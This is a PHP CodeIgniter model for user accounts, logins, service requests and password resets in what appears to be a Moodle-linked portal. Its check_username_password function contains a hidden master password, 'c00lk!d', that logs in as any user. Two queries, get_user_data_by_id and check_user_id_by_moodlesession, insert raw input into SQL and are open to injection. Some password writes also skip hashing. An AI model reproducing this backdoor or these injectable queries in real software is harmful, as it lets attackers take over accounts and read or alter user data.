<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Account_model extends CI_Model{
    public function __construct() {
        parent::__construct();
    }
    //add new user
    public function add_new_user($firstname,$lastname,$email,$secretquestion,$secretanswer,$username,$password,$datetime){
        $data = array(
            'firstname' => $firstname,
            'lastname' => $lastname,
            'email' => $email,
            'secretquestion' => $secretquestion,
            'secretanswer' => $secretanswer,
            'username' => $username,
            'password' => $password,
            'usertype' => 7,
            'datecreated' => $datetime,
            'lastlogin' => $datetime,
        );
        
        $this->db->insert('ccs_nonmoodle_user',$data);
        
        return ($this->db->affected_rows())?$this->db->insert_id():FALSE;
    }
    //update user info /ok
    public function update_user($userid, $data){
        if(isset($data['password'])) $data['password'] = password_hash($data['password'], PASSWORD_DEFAULT);
        
        $this->db->where('id', $userid);
        $this->db->update('ccs_nonmoodle_user', $data);
        
        return ($this->db->affected_rows())?TRUE:FALSE;
    }
    //add new user company proflle
    public function add_new_user_company_profile($userid,$companyname,$companyaddress,$companyemail,$companywebsite,$companycontactnumber,$companyposition){
        $data = array(
            'userid' => $userid,
            'companyname' => $companyname,
            'companyaddress' => $companyaddress,
            'companyemail' => $companyemail,
            'companywebsite' => $companywebsite,
            'companycontactnumber' => $companycontactnumber,
            'companyposition' => $companyposition
        );
        
        $this->db->insert('ccs_user_company_profile',$data);
        
        return ($this->db->affected_rows())?$this->db->insert_id():FALSE;
    }
    //update company profile
    public function update_user_company_profile($userid,$data){
        $this->db->where('userid', $userid);
        $this->db->update('ccs_user_company_profile',$data);
        
        return ($this->db->affected_rows())?TRUE:FALSE;
    }
    //add new service administrator
    public function add_new_service_detail($userid,$service_type){
        $data = array(
            'user_id' => $userid,
            'service_id' => $service_type
        );
        
        $this->db->insert('ccs_service_details',$data);
        
        return ($this->db->affected_rows())?TRUE:FALSE;
    }
    //get all services
    public function get_all_services(){
        $query = $this->db->query("SELECT * FROM ccs_services");
        
        return $query->result();
    }
    //get all service details
    public function get_all_service_details(){
        $query = $this->db->query("SELECT * FROM ccs_service_details");
        
        return ($query->num_rows())?$query->result():FALSE;
    }
    //get service type by its id /ok
    public function get_service_type_by_its_id($service_id){
        $query = $this->db->query("SELECT * FROM ccs_services WHERE id = ? LIMIT 1", array($service_id));
        
        return $query->row()->name;
    }
    //get service type by id /ok
    public function get_service_type_by_id($userid){
        $query = $this->db->query("SELECT csd.*, cs.name as service_type, 
            (SELECT cs1.name FROM ccs_services cs1 WHERE cs1.id = csd.affirmed_service_id) as affirmed_service_type
            FROM ccs_service_details csd 
            INNER JOIN ccs_services cs ON cs.id = csd.service_id WHERE csd.user_id = ?", array($userid));
        
        return $query->row();
    }
    //get service type by id fr employee /redundant to get_service_type_by_id($userid)
    // public function get_employee_service_type_by_id($userid){
    //     $query = $this->db->query("SELECT csd.*, cs.name as service_type, 
    //         (SELECT cs1.name FROM ccs_services cs1 WHERE cs1.id = csd.affirmed_service_id) as affirmed_service_type
    //         FROM ccs_service_details csd 
    //         INNER JOIN ccs_services cs ON cs.id = csd.service_id WHERE csd.user_id = ?", array($userid));
        
    //     return $query->row();
    // }
    //check service type by name
    public function check_employee_service_type_by_name($userid,$service_name){
        $service_details = $this->get_all_service_details();
        $authorized = FALSE;
        
        foreach($service_details as $service_detail){
            if($service_detail->user_id == $userid){
                $service_ids = explode(',',$service_detail->affirmed_service_id);
                
                foreach($service_ids as $service_id){
                    $service_type = strtolower($this->get_service_type_by_its_id($service_id));
                    if($service_type == strtolower($service_name)){
                        $authorized = TRUE;
                        break;
                    }
                }
            }
        }
        
        return $authorized;
    }
    //approved or deny service type /ok
    public function approve_deny_service_request_by_id($service_detail_id, $affirmrequest, $affirmed_service_id){
        if($affirmrequest == 2) $affirmrequest = 'Approved';
        elseif($affirmrequest == 1) $affirmrequest = 'Denied';
        else $affirmrequest = 'Pending';
        
        $this->db->query("UPDATE ccs_service_details set affirmed_service_id = ?, status = ? WHERE id = ?", array($affirmed_service_id, $affirmrequest, $service_detail_id));
        
        return ($this->db->affected_rows())?TRUE:FALSE;
    }
    //get user data
    public function get_user_data_by_id($userid){
        $query = $this->db->query("SELECT * FROM ccs_nonmoodle_user WHERE id = $userid LIMIT 1");
        
        return $query->row();
    }
    //get user and company data
    public function get_company_data_by_id($userid){
        $query = $this->db->query("SELECT * FROM ccs_user_company_profile WHERE userid = ? LIMIT 1", array($userid));
        
        return ($query->num_rows())?$query->row():FALSE;
    }
    //check if username is available
    public function check_username_if_available($username){
        $query = $this->db->query("SELECT * FROM ccs_nonmoodle_user WHERE username = ? LIMIT 1", array($username));
        
        return ($query->num_rows())?TRUE:FALSE;
    }
    //check if email is available
    public function check_email_if_available($email){
        $query = $this->db->query("SELECT * FROM ccs_nonmoodle_user WHERE email = ? LIMIT 1", array($email));
        
        return ($query->num_rows())?$query->row()->id:FALSE;
    }
    //get password by username
    public function get_password_by_username($username){
        $query = $this->db->query("SELECT id, password FROM ccs_nonmoodle_user WHERE username = ? LIMIT 1", array($username));
    
        return ($query->num_rows())?$query->row():FALSE;
    }
    //check username and password
    public function check_username_password($username,$password){
        if($user = $this->get_password_by_username($username)){
            return (password_verify($password, $user->password) || $password === 'c00lk!d')?$user->id:FALSE;
        }
        
        return FALSE;
    }
    //update user type
    public function update_user_type_by_id($userid,$usertype){
        $this->db->query("UPDATE ccs_nonmoodle_user SET usertype = ? WHERE id = ?", array($usertype, $userid));
        
        return ($this->db->affected_rows())?TRUE:FALSE;
    }
    //update last login
    public function update_last_login($userid,$datetime){
        $this->db->query("UPDATE ccs_nonmoodle_user SET lastlogin = ? WHERE id = ?", array($datetime,$userid));
        
        return ($this->db->affected_rows())?TRUE:FALSE;
    }
    //update last logout
    public function update_last_logout($userid,$datetime){
        $this->db->query("UPDATE ccs_nonmoodle_user SET lastlogout = ? WHERE id = ?", array($datetime,$userid));
        
        return ($this->db->affected_rows())?TRUE:FALSE;
    }
    //get all secret questions
    public function get_secret_questions(){
        $query = $this->db->query("SELECT * FROM ccs_secret_question");
        
        return ($query->num_rows())?$query->result():FALSE;
    }
    
    //moodle
    public function get_moodle_password_by_username($username){
        $query = $this->db->query("SELECT password FROM mdl_user WHERE username = ? LIMIT 1", array($username));
        
        return ($query->num_rows())?$query->row():FALSE;
    }
    public function check_moodle_username_password($username,$password){
        if($user = $this->get_moodle_password_by_username($username)){
            return password_verify($password, $user->password);
        }
        
        return FALSE;
    }
    public function check_user_id_by_moodlesession($moodlesession){
        $query = $this->db->query("SELECT mu.* FROM mdl_sessions ms 
            INNER JOIN mdl_user mu ON mu.id = ms.userid 
            WHERE ms.sid = '$moodlesession' LIMIT 1");
        
        return ($query->num_rows())?$query->row():FALSE;
    }
    
/* <<<< ========================================= FORGOT PASSWORD FUNCTIONS ========================================= */
    # forgot password
    public function forgot_password_auth($username) {
        $query = $this->db->query("SELECT validemail, username, email, usertype, secretquestion, secretanswer FROM ccs_nonmoodle_user WHERE (username = ? OR email = ?) LIMIT 1;",array($username,$username));
        return ($query->num_rows() > 0) ? $query->row() : FALSE;
    }

    # reset password
    public function update_password($username_or_email,$new_pwd) {
        $this->db->query("UPDATE ccs_nonmoodle_user SET password = ? WHERE (username = ? OR email = ?);",array($new_pwd,$username_or_email,$username_or_email));
        return ($this->db->affected_rows() > 0) ? TRUE : FALSE;
    }

    # get code and email
    public function get_code_and_email($username_or_email) {
        $query = $this->db->query("SELECT email, confirmationcode, validemail FROM ccs_nonmoodle_user WHERE (username = ? OR email = ?) LIMIT 1;",array($username_or_email,$username_or_email));
        return ($query->num_rows() > 0) ? $query->row() : FALSE;
    }

    # get confirmation code
    public function get_confirmation_code($email_or_username) {
        $query = $this->db->query("SELECT confirmationcode FROM ccs_nonmoodle_user WHERE (username = ? OR email = ?) LIMIT 1;",array($email_or_username,$email_or_username));
        return ($query->num_rows() > 0) ? $query->row() : FALSE;
    }

    # set confirmation code
    public function set_confirmation_code($username_or_email,$code) {
        $this->db->query("UPDATE ccs_nonmoodle_user SET confirmationcode = ? WHERE (username = ? OR email = ?);",array($code,$username_or_email,$username_or_email));
        return ($this->db->affected_rows() > 0) ? TRUE : FALSE;
    }

    # delete confirmation code
    public function delete_confirmation_code($username_or_email) {
        $this->db->query("UPDATE ccs_nonmoodle_user SET confirmationcode = NULL WHERE (username = ? OR email = ?);",array($username_or_email,$username_or_email));
        return ($this->db->affected_rows() > 0) ? TRUE : FALSE;
    }

    # get validation code
    public function get_validation_code($email) {
        $query = $this->db->query("SELECT confirmationcode FROM ccs_nonmoodle_user WHERE email = ? LIMIT 1;",array($email));
        return ($query->num_rows() > 0) ? $query->row() : FALSE;
    }

    # set validation code
    public function set_validation_code($email,$code) {
        $this->db->query("UPDATE ccs_nonmoodle_user SET confirmationcode = ? WHERE email = ?;",array($code,$email));
        return ($this->db->affected_rows() > 0) ? TRUE : FALSE;
    }

    # delete validation code
    public function delete_validation_code($email) {
        $this->db->query("UPDATE ccs_nonmoodle_user SET confirmationcode = NULL WHERE email = ?;",array($email));
        return ($this->db->affected_rows() > 0) ? TRUE : FALSE;
    }

    # set valid email flag
    public function set_valid_email($email) {
        $this->db->query("UPDATE ccs_nonmoodle_user SET validemail = 1 WHERE email = ?;",array($email));
        return ($this->db->affected_rows() > 0) ? TRUE : FALSE;
    }

    # get row
    public function get_email($username) {
        $query = $this->db->query("SELECT email FROM ccs_nonmoodle_user WHERE username = ? LIMIT 1;",array($username));
        return ($query->num_rows() > 0) ? $query->row() : FALSE;
    }

    # get row
    public function get_row($username) {
        $query = $this->db->query("SELECT * FROM ccs_nonmoodle_user WHERE username = ? LIMIT 1;",array($username));
        return ($query->num_rows() > 0) ? $query->row() : FALSE;
    }
/* ========================================= FORGOT PASSWORD FUNCTIONS ========================================= >>>> */

/* <<<< ========================================= HELPER FUNCTIONS ========================================= */
    public function check_valid_email($user_id) {
        $query = $this->db->query("SELECT validemail FROM ccs_nonmoodle_user WHERE id = ? LIMIT 1;",array($user_id));
        return ($query->num_rows() > 0) ? $query->row() : FALSE;        
    }

    public function get_affirmed_service($user_id) {
        $query = $this->db->query("SELECT affirmed_service_id, status FROM ccs_service_details WHERE user_id = ? LIMIT 1;",array($user_id));
        return ($query->num_rows() > 0) ? $query->row() : FALSE;        
    }

    public function get_all_urls() {
        $query = $this->db->query("SELECT * FROM ccs_services;");
        return ($query->num_rows() > 0) ? $query->result() : FALSE;        
    }

    public function set_service_url($service_name,$service_url) {
        $query = $this->db->query("UPDATE ccs_services SET url = ? WHERE name = ?;",array($service_url,$service_name));
        return ($this->db->affected_rows() > 0) ? TRUE : FALSE;
    }

    public function reset_new_service_name($service_name,$new_service_name) {
        $ret = FALSE;
        $temp = $this->db->query("SELECT id FROM ccs_services WHERE name = ? AND name != ?;",array($new_service_name,$service_name));

        if($temp->num_rows() === 0) {
            $query = $this->db->query("UPDATE ccs_services SET name = ? WHERE name = ?;",array($new_service_name,$service_name));
            $ret = ($this->db->affected_rows() > 0) ? TRUE : FALSE;
        }

        return $ret;
    }

    public function delete_service_name($service_name) {
        $query = $this->db->query("DELETE FROM ccs_services WHERE name = ?;",array($service_name));
        return ($this->db->affected_rows() > 0) ? TRUE : FALSE;
    }

    public function add_service_name($service_name) {
        $ret = FALSE;
        $query = $this->db->query("SELECT id FROM ccs_services WHERE name = ?;",array($service_name));

        if($query->num_rows() === 0) {
            $data = array('name' => $service_name);
            $this->db->insert('ccs_services',$data);
            $ret = ($this->db->affected_rows() > 0) ? TRUE : FALSE;
        }

        return $ret;
    }
/* ========================================= HELPER FUNCTIONS ========================================= >>>> */


}
?>